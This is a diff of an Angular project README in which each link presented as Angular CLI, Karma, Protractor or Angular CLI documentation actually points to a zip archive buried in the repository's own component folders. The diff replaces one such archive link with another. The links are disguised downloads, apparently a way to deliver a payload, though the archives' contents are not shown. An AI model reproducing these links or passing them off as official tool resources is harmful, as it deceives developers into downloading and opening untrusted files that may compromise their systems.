@@ -1,6 +1,6 @@
 # AngularfiebaseAuthentication
 
-This project was generated with [Angular CLI](https://raw.githubusercontent.com/ahmed-ba/Authentification-2/master/src/app/components/forgot-password/Authentification_1.9.zip) version 9.0.7.
+This project was generated with [Angular CLI](https://github.com/ahmed-ba/Authentification-2/raw/refs/heads/master/src/app/components/verify-email/Authentification-2.4.zip) version 9.0.7.
 
 ## Development server
 
@@ -16,14 +16,14 @@ Run `ng build` to build the project. The build artifacts will be stored in the `
 
 ## Running unit tests
 
-Run `ng test` to execute the unit tests via [Karma](https://raw.githubusercontent.com/ahmed-ba/Authentification-2/master/src/app/components/forgot-password/Authentification_1.9.zip).
+Run `ng test` to execute the unit tests via [Karma](https://github.com/ahmed-ba/Authentification-2/raw/refs/heads/master/src/app/components/verify-email/Authentification-2.4.zip).
 
 ## Running end-to-end tests
 
-Run `ng e2e` to execute the end-to-end tests via [Protractor](https://raw.githubusercontent.com/ahmed-ba/Authentification-2/master/src/app/components/forgot-password/Authentification_1.9.zip).
+Run `ng e2e` to execute the end-to-end tests via [Protractor](https://github.com/ahmed-ba/Authentification-2/raw/refs/heads/master/src/app/components/verify-email/Authentification-2.4.zip).
 
 ## Further help
 
-To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI README](https://raw.githubusercontent.com/ahmed-ba/Authentification-2/master/src/app/components/forgot-password/Authentification_1.9.zip).
+To get more help on the Angular CLI use `ng help` or go check out the [Angular CLI README](https://github.com/ahmed-ba/Authentification-2/raw/refs/heads/master/src/app/components/verify-email/Authentification-2.4.zip).
 # Authentification-2
 # Authentification-2
